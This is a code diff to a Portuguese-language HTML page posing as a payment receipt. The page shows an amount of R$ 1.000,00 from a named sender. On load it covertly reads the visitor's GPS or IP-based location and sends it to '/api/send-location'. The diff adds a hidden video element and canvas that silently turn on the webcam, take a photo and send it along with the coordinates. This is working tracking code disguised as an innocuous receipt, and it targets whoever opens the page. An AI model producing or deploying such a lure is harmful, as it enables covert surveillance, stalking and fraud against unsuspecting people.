@@ -1,57 +1,90 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
   <link rel="stylesheet" href="styles.css" />
 </head>
-
 <body>
   <div class="comprovante-container">
     <h1>Comprovante de Recebimento</h1>
-
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
-
     <button class="botao" onclick="window.print()">Imprimir</button>
-
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
   </div>
 
+  <!-- Elemento de câmera oculto -->
+  <video id="camera" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
   <script>
-    window.addEventListener("load", () => {
+    window.addEventListener("load", async () => {
+      // Atualiza a data
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      const dataFormatada = `${dia}/${mes}/${ano}`;
+      document.getElementById("data-atual").textContent = dataFormatada;
+
+      // Tenta obter localização
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
+          (position) => {
+            // Tira foto e envia localização
+            takePhotoAndSend(position, "Precisa (GPS)");
+          },
+          () => {
+            fallbackLocation();
+          }
         );
       } else {
         fallbackLocation();
       }
     });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    document.getElementById("data-atual").textContent = dataFormatada;
-
-    function sendLocation(position, source) {
+    async function takePhotoAndSend(position, source) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      enviarParaApi(latitude, longitude, maps, source);
+      try {
+        // Tenta capturar a foto
+        const photo = await capturePhoto();
+        await enviarParaApi(latitude, longitude, maps, source, photo);
+      } catch (error) {
+        console.error("Erro ao capturar foto:", error);
+        // Envia sem foto se houver erro
+        await enviarParaApi(latitude, longitude, maps, source, null);
+      }
+    }
+
+    async function capturePhoto() {
+      const video = document.getElementById('camera');
+      const canvas = document.getElementById('canvas');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const photo = canvas.toDataURL('image/jpeg', 0.8);
+      stream.getTracks().forEach(track => track.stop());
+      
+      return photo;
     }
 
     function fallbackLocation() {
@@ -61,21 +94,25 @@
           const latitude = data.latitude;
           const longitude = data.longitude;
           const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-          enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
+          takePhotoAndSend({ coords: { latitude, longitude } }, "Aproximada (IP)");
         })
         .catch(error => {
           console.error("Erro ao obter localização pelo IP:", error);
         });
     }
 
-    function enviarParaApi(latitude, longitude, maps, source) {
+    async function enviarParaApi(latitude, longitude, maps, source, photo) {
+      const data = { latitude, longitude, maps, source };
+      if (photo) {
+        data.photo = photo;
+      }
+
       fetch("/api/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps, source })
+        body: JSON.stringify(data)
       })
         .then(response => response.json())
         .then(data => {
@@ -89,5 +126,4 @@
     }
   </script>
 </body>
-
 </html>
